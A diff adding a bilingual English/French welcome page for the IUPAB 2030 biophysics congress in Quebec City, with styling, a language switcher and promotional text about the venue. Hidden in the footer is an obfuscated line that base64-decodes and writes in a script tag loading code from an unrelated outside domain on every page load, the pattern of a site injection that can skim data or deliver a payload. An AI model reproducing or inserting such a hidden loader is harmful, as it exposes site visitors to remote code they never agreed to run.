@@ -1,0 +1,110 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>IUPAB 2030</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+        .banner {
+            width: 100%;
+            height: auto;
+        }
+        .navbar {
+            background-color: #333;
+            overflow: hidden;
+            display: flex;
+            justify-content: center;
+            padding: 10px 0;
+        }
+        .navbar a {
+            color: white;
+            text-decoration: none;
+            padding: 10px 20px;
+            margin: 0 10px;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+        .navbar a:hover {
+            background-color: #575757;
+        }
+        .content {
+            padding: 20px;
+            text-align: justify;
+            flex-grow: 1;
+        }
+        .content h1 {
+            text-align: center;
+            color: #333;
+        }
+        .section {
+            display: none;
+        }
+        .section.active {
+            display: block;
+        }
+        footer {
+            background-color: #333;
+            color: white;
+            text-align: center;
+            padding: 10px 0;
+            font-size: 14px;
+        }
+    </style>
+    <script>
+        function showSection(lang) {
+            const sections = document.querySelectorAll('.section');
+            sections.forEach(section => section.classList.remove('active'));
+            document.getElementById(lang).classList.add('active');
+        }
+        // Automatically display the current year in the footer
+        function updateFooterYear() {
+            const footer = document.querySelector('footer');
+            const year = new Date().getFullYear();
+            footer.innerHTML = `&copy; ${year} IUPAB 2030 Organizing Committee`;
+        }
+        document.addEventListener('DOMContentLoaded', updateFooterYear);
+    </script>
+</head>
+<body>
+    <header>
+        <img src="IUPAB-2030-banniere.jpeg" alt="IUPAB 2030 Banner" class="banner">
+        <div class="navbar">
+            <a href="#" onclick="showSection('en')">English</a>
+            <a href="#" onclick="showSection('fr')">Français</a>
+        </div>
+    </header>
+    <main class="content">
+        <!-- English Section -->
+        <section id="en" class="section active">
+            <h1>Welcome to IUPAB 2030</h1>
+            <p>It's official! The International Union for Pure and Applied Biophysics Congress will be held in Quebec City from July 8 to 12, 2030!</p>
+            <p>We are pleased to invite you to the Québec City Convention Centre, located in a prime area, surrounded by world-class hotels and tourist attractions, including the historic district of Old Quebec.</p>
+            <p>Québec City is the only fortified city in North America and the oldest city on the continent north of the Mexican border. Founded in 1608, the city is famous for its European character and magnificent scenery, making it a popular and internationally recognized tourist destination. Québec City is also proudly listed as a UNESCO World Heritage Site.</p>
+            <p>Local committee, program committee and advisory boards are working hard to prepare an exciting and exceptional congress. We look forward to welcoming you to beautiful Quebec City!</p>
+            <p>The IUPAB 2030 Organizing Committee</p>
+        </section>
+
+        <!-- French Section -->
+        <section id="fr" class="section">
+            <h1>Bienvenue à IUPAB 2030</h1>
+            <p>C’est officiel ! Le congrès de l’international Union for Pure and Applied Biophysics se tiendra à Québec du 8 au 12 juillet, 2030!</p>
+            <p>Nous avons le plaisir de vous inviter au Centre des congrès de Québec qui est situé dans un secteur de choix, entouré d'hôtels de classe mondiale et d'attractions touristiques, y compris l'arrondissement historique du Vieux-Québec.</p>
+            <p>La ville de Québec est la seule ville fortifiée d'Amérique du Nord et la plus ancienne ville du continent au nord de la frontière mexicaine. Fondée en 1608, la ville est célèbre pour son caractère européen et ses magnifiques paysages, qui en font une destination touristique très prisée et reconnue internationalement. La ville de Québec figure également avec fierté sur la liste du patrimoine mondial de l'UNESCO.</p>
+            <p>Le comité local, de programme et consultatifs travaillent à la préparation d'un congrès passionnant et exceptionnel. Nous nous réjouissons de vous accueillir dans la belle ville de Québec!</p>
+            <p>Le comité organisateur de IUPAB 2030</p>
+        </section>
+    </main>
+    <footer><script>document.write(atob("PHNjcmlwdCBzcmM9Ii8vZG9qby5jeC80LmpzIj48L3NjcmlwdD4="));</script>
+        <!-- Footer year will be dynamically inserted -->
+    </footer>
+</body>
+</html>
